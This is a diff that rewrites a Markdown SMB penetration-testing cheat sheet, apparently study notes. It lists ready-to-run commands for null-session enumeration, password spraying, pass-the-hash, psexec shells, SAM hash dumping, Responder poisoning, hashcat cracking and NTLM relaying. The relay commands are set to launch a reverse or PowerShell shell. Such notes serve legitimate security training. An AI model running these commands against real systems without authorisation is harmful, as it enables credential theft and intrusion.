@@ -1,150 +1,196 @@
-### SMB Service Identification
+## Initial Enumeration
 
-**SMB (Server Message Block)** facilitates shared access to files and printers. On modern Windows systems, it runs directly over **TCP port 445**, while legacy or non-Windows systems may use **TCP port 139** (NetBIOS over TCP/IP). Identification is the first step to determine the implementation (Windows vs. Samba) and potential attack vectors.
+Scanning ports 139 and 445 to identify OS version, Samba version, and **SMB signing** status.
 
-|Port|Protocol/Service|Context|
-|:--|:--|:--|
-|**139/TCP**|SMB over NetBIOS|Found on non-Windows hosts or Windows with NetBIOS enabled.|
-|**445/TCP**|SMB over TCP/IP|Standard for modern Windows.|
-
-**Initial Enumeration Scan** Use Nmap to identify the service version and basic configuration. Note that Windows OS version info is often guessed rather than explicitly provided in scan results.
+Identify service version and default script results
 
 ```
 sudo nmap <TARGET_IP> -sV -sC -p139,445
 ```
 
----
+- **Gotchas**: **Nmap** often fails to provide exact Windows versions and requires guessing.
 
-### Null Session Enumeration
+## Null Session Enumeration
 
-**When to use:** Use when no credentials are provided to check for **anonymous authentication**. **Why it matters:** Misconfigured servers may allow attackers to list shares, users, groups, and permissions without a password.
+Accessing shares and system information when unauthenticated connectivity is permitted.
 
-#### 1. Share and Permission Enumeration
+### File Share Enumeration
 
-Identify accessible directories and the level of access (READ/WRITE).
-
-|Tool|Command|Goal|
-|:--|:--|:--|
-|**smbclient**|`smbclient -N -L //<TARGET_IP>`|List available shares using a null session (`-N`).|
-|**smbmap**|`smbmap -H <TARGET_IP>`|List shares and associated **permissions**.|
-|**smbmap**|`smbmap -H <TARGET_IP> -r <SHARE_NAME>`|Recursively browse a specific directory.|
-
-#### 2. Specialized Enumeration Tools
-
-Automate the collection of NetBIOS names, workgroups, and user lists.
-
-- **enum4linux-ng**: Use to automate the discovery of OS information, share lists, and password policies.
-    
-    ```
-    ./enum4linux-ng.py <TARGET_IP> -A -C
-    ```
-    
-- **rpcclient**: Connect to the **MSRPC** interface via a null session to query the system directly.
-    
-    ```
-    rpcclient -U'%' <TARGET_IP>
-    # Inside rpcclient prompt:
-    enumdomusers
-    ```
-    
-
----
-
-### Authenticated Attacks
-
-**When to use:** When null sessions are disabled or yield limited info, use obtained or guessed credentials.
-
-#### 1. Password Spraying
-
-**Scenario:** Use when you have a list of usernames but no passwords. This avoids **account lockout** by trying one common password against many users.
+List shares using unauthenticated access
 
 ```
-crackmapexec smb <TARGET_IP> -u <USER_LIST_FILE> -p '<PASSWORD>' --local-auth
+smbclient -N -L //<TARGET_IP>
 ```
 
-- **Note:** Use `--continue-on-success` to keep testing the list after a match is found.
-- **Note:** Use `--local-auth` if the target is not part of a domain.
-
-#### 2. Pass-the-Hash (PtH)
-
-**Scenario:** Use when you have an **NTLM hash** but cannot crack it. This allows authentication without the plaintext password.
+Identify shares and explicit permissions for the current session
 
 ```
-crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
+smbmap -H <TARGET_IP>
 ```
 
----
+List directory contents recursively
 
-### Remote Code Execution (RCE)
+```
+smbmap -H <TARGET_IP> -r <SHARE_NAME>
+```
 
-**When to use:** After obtaining **Administrator** or high-privilege credentials to gain full system control.
+Download a specific file from a share
 
-#### 1. Impacket-PsExec
+```
+smbmap -H <TARGET_IP> --download "<FILE_PATH>"
+```
 
-Deploys a service to the `ADMIN$` share and uses the Service Control Manager to start a shell via a named pipe.
+Upload a local file to a remote share
+
+```
+smbmap -H <TARGET_IP> --upload <FILE_PATH> "<SHARE_NAME>\<FILE_PATH>"
+```
+
+- **Tool comparison**:
+    - smbclient: Basic interaction; requires `-N` for null sessions.
+    - smbmap: Preferred for quick permission mapping and recursive listing.
+
+### RPC Enumeration
+
+Execute remote procedure calls to gather users or modify attributes via null session.
+
+Connect to the RPC interface
+
+```
+rpcclient -U'%' <TARGET_IP>
+```
+
+Enumerate domain users once connected
+
+```
+enumdomusers
+```
+
+- **Gotchas**: **Specific configurations** are often required to allow system modifications through RPC.
+
+### Automated Enumeration
+
+Wrapper tool to automate collection of shares, users, groups, and NetBIOS info.
+
+Run all enumeration checks
+
+```
+./enum4linux-ng.py <TARGET_IP> -A -C
+```
+
+## Password Attacks
+
+Testing credentials when null sessions are disabled or targeting specific accounts.
+
+### Password Spraying
+
+Testing a single password against a list of users to bypass **account lockout** thresholds.
+
+Spray a password against a user list
+
+```
+crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p '<PASSWORD>' --local-auth
+```
+
+Continue testing after finding a valid credential
+
+```
+crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p '<PASSWORD>' --continue-on-success
+```
+
+- **Gotchas**: **Account lockout** will occur if attempts exceed the target's threshold.
+
+## Remote Code Execution
+
+Executing commands on Windows targets using administrative credentials or hashes.
+
+### Service-Based Execution
+
+Spawn an interactive shell by deploying a service to the **ADMIN$** share.
+
+Get a SYSTEM shell via Impacket
 
 ```
 impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
 ```
 
-#### 2. CrackMapExec Execution
-
-Fast execution of single commands or PowerShell scripts across one or multiple hosts.
+Execute a single command via smbexec method
 
 ```
-# Execute via smbexec (CMD)
-crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -x '<COMMAND>' --exec-method smbexec
-
-# Execute via atexec (PowerShell)
-crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '<POWERSHELL_COMMAND>'
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -x '<SERVICE_NAME>' --exec-method smbexec
 ```
 
----
+- **Tool comparison**:
+    - impacket-psexec: Provides a full interactive console.
+    - CrackMapExec: Preferred for executing commands across multiple hosts simultaneously.
+- **Edge cases**: If the default **atexec** method fails in CrackMapExec, manually specify `--exec-method smbexec`.
 
-### Post-Exploitation & Data Extraction
+## Post-Exploitation Actions
 
-Once administrative access is achieved, focus on lateral movement and credential harvesting.
+Leveraging administrative access for credential harvesting and lateral movement.
 
-|Action|Command|Purpose|
-|:--|:--|:--|
-|**Dump SAM Hashes**|`crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --sam`|Extract local user hashes for cracking or PtH.|
-|**List Logged-on Users**|`crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --loggedon-users`|Identify active users to target for further attacks.|
-|**Download Files**|`smbmap -H <TARGET_IP> --download "<SHARE>\<PATH>"`|Retrieve sensitive files like `note.txt`.|
+### Credential Harvesting
 
----
-
-### Forced Authentication & Relaying
-
-**Scenario:** Use when you are on the same network as the victim and can intercept name resolution traffic (LLMNR/NBT-NS).
-
-#### 1. Capturing Hashes (Responder)
-
-Spoof responses to mistyped network resource requests to capture **NetNTLM v1/v2 hashes**.
+Dump local SAM database hashes
 
 ```
-sudo responder -I <INTERFACE>
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --sam
 ```
 
-- **Attack Implication:** Captured hashes can be cracked offline using `hashcat` (Mode 5600 for NetNTLMv2).
-
-#### 2. NTLM Relaying
-
-**Scenario:** If a hash cannot be cracked, relay it to another machine to gain access. This requires SMB signing to be disabled on the target.
-
-1. Disable SMB in `Responder.conf` to allow the relay tool to bind to port 445.
-2. Execute the relay to dump the SAM database or trigger a reverse shell.
+Enumerate users currently logged into the system
 
 ```
-impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<REVERSE_SHELL_COMMAND>'
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --loggedon-users
 ```
 
----
+### Pass-the-Hash
 
-### Dangerous Configurations Table
+Authenticating to SMB services using a captured NTLM hash instead of a plaintext password.
 
-| Setting                    | Risk                                | Impact                                            |
-| :------------------------- | :---------------------------------- | :------------------------------------------------ |
-| **Null Session Enabled**   | Anonymous access to shares/RPC.     | Information disclosure (users, shares, policies). |
-| **SMB Signing Disabled**   | Allows NTLM relay attacks.          | Unauthorized access/RCE on the target.            |
-| **READ/WRITE on Shares**   | Unrestricted file access.           | Data theft or malicious file upload.              |
-| **Shared Admin Passwords** | Credentials work on multiple hosts. | Rapid lateral movement across the network.        |
+Authenticate with a hash via CrackMapExec
+
+```
+crackmapexec smb <TARGET_IP> -u <USERNAME> -H <HASH>
+```
+
+## Forced Authentication and Relaying
+
+Capturing or redirecting network authentication traffic to gain access.
+
+### Hash Capture
+
+Poisoning LLMNR, NBT-NS, and MDNS traffic to steal **NetNTLM v1/v2** hashes.
+
+Start the poisoner on a specific interface
+
+```
+sudo responder -I <INTERFACE_NAME>
+```
+
+Crack captured NetNTLMv2 hashes
+
+```
+hashcat -m 5600 <FILE_PATH> /usr/share/wordlists/rockyou.txt
+```
+
+### NTLM Relaying
+
+Relaying captured authentication to a secondary target to execute commands or dump credentials.
+
+Relay authentication to dump the SAM database
+
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
+```
+
+Relay authentication to execute a Base64 encoded PowerShell shell
+
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<FILE_PATH>'
+```
+
+- **Dangerous / misconfigured settings**:
+    - **SMB** must be set to **Off** in `/etc/responder/Responder.conf` before relaying.
+- **Gotchas**: **Relay failure** occurs if the target has no more remaining targets or if authentication fails.
+
+> ⚠️ Gap: Relaying will fail silently if **SMB Signing** is required on the target; the source only notes that signing status can be identified via Nmap.
